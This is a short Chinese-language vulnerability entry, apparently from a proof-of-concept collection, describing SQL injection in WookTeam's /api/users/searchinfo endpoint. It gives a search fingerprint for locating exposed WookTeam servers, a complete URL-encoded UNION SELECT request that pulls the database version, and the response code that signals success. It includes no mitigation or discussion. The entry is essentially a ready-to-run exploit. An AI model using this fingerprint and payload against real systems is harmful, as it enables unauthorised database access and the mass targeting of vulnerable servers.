# WookTeam接口searchinfo存在SQL注入漏洞

WookTeam ｜ SQL注入 ｜ —
- **指纹**：`title="Wookteam"`
- **请求**：`GET /api/users/searchinfo?where[username]=1%27%29+UNION+ALL+SELECT+NULL%2CCONCAT%280x7e%2Cversion%28%29%2C0x7e%29%2CNULL%2CNULL%2CNULL%23 HTTP/1.1`
- **响应特征**：200